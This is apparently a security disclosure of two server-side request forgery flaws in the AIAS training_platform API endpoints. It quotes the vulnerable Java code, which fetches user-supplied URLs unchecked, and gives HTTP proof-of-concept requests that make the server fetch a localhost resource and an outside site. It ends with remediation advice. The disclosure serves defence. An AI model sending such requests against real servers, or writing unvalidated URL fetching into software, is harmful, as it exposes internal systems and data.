There are SSRF vulnerabilities in two APIs of AIAS subsystem training_platform

# Vulnerability Description

The open source Java AI one-stop solution project "[mymagicpower/AIAS](https://github.com/mymagicpower/AIAS)" has two APIs in the subsystem "training_platform" that have SSRF vulnerabilities.

- Vulnerability Discloser: [Tr0e](https://github.com/Tr0e)

- Vendors:  [http://aias.top/](http://aias.top/)

- Source code address：[https://github.com/mymagicpower/AIAS](https://github.com/mymagicpower/AIAS)

Note:  **This vulnerability was discovered automatically by my AI code audit tool**.

# Vulnerability Analysis

The vulnerability code entry point is located at：

[2_training_platform/train-platform/src/main/java/top/aias/training/controller/InferController.java](https://github.com/mymagicpower/AIAS/blob/main/2_training_platform/train-platform/src/main/java/top/aias/training/controller/InferController.java)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
    //AIAS-main\2_training_platform\train-platform\src\main\java\top\aias\training\controller\InferController.java
    @GetMapping(value = "/classInfoForUrl", produces = "application/json;charset=utf-8")
    public ResultBean getClassInfoForUrl(@RequestParam(value = "url") String url) {
        // properties.getPath().getPath() + type + File.separator
        TrainArgument trainArgument = trainArgumentService.getTrainArgument();
        String labels = trainArgument.getClassLabels();
        // 还原回 List<String>
        List<String> labelsList = Arrays.stream(labels.substring(1, labels.length() - 1) // 去除方括号
                        .split(", ")) // 以 ", " 分割
                .map(String::trim) // 去除多余空格
                .collect(Collectors.toList());

        String result = inferService.getClassificationInfoForUrl(properties.getPath().getSavePath(), url, labelsList);
        return ResultBean.success().add("result", result);
    }

    //AIAS-main\2_training_platform\train-platform\src\main\java\top\aias\training\service\impl\InferServiceImpl.java
    public String getClassificationInfoForUrl(String newModelPath, String imageUrl, List<String> labels) {
        try {
            Image img = ImageFactory.getInstance().fromUrl(imageUrl);
            ClassPrediction classifications = ImageClassification.predict(newModelPath, img, labels);
            return classifications.toString();
        } catch (Exception e) {
            logger.error(e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    //AIAS-main\2_training_platform\train-platform\src\main\java\top\aias\training\controller\InferController.java
    //@ApiOperation(value = "Image Comparison (1:1)-URL")
    @GetMapping(value = "/compareForImageUrls")
    public ResultBean compareForImageUrls(@RequestParam(value = "url1") String url1, @RequestParam(value = "url2") String url2) throws IOException, TranslateException, ModelException {
        Image image1 = ImageFactory.getInstance().fromUrl(url1);
        Image image2 = ImageFactory.getInstance().fromUrl(url2);
        String result = inferService.compare(properties.getPath().getSavePath(),image1, image2);
        return ResultBean.success().add("result", result);
    }
```

From the above code, we can see that the two external APIs "/classInfoForUrl" and "/compareForImageUrls" receive URL parameters passed from the outside, and directly initiate http requests to the target URL through "ImageFactory.getInstance().fromUrl(url)" without any verification and filtering, which constitutes a typical SSRF vulnerability.

SSRF (Server-Side Request Forgery) vulnerabilities can allow attackers to access internal systems, services, or sensitive data by exploiting the server's ability to make unauthorized external requests, potentially leading to information disclosure, unauthorized access, or further exploitation within the network.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file.

The vulnerability proof of concept (POC) is as follows:

```js
GET /api/inference/classInfoForUrl?url=http://127.0.0.1:9001/test.txt HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i


GET /api/inference/compareForImageUrls?url1=http://127.0.0.1:9001/test.txt&url2=https://www.bing.com HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The relevant verification screenshots are shown below:

http://127.0.0.1:8089/api/inference/classInfoForUrl?url=http://127.0.0.1:9001/test.txt  
http://127.0.0.1:8089/api/inference/compareForImageUrls?url1=http://127.0.0.1:9001/test.txt&url2=https://www.bing.com
![image](https://github.com/user-attachments/assets/35826fae-d8d3-45c9-969d-517a246a1292)

![image](https://github.com/user-attachments/assets/a77403a6-362d-4084-a1e9-e9f09a35a06f)


# Security Suggestions

To fix SSRF (Server-Side Request Forgery) vulnerabilities, validate and sanitize all user-supplied input used in HTTP requests, restrict server access to trusted internal resources by implementing proper whitelisting or IP filtering, use secure coding practices to prevent unintended outbound requests, and consider proxying external requests through a controlled intermediary with appropriate access controls.
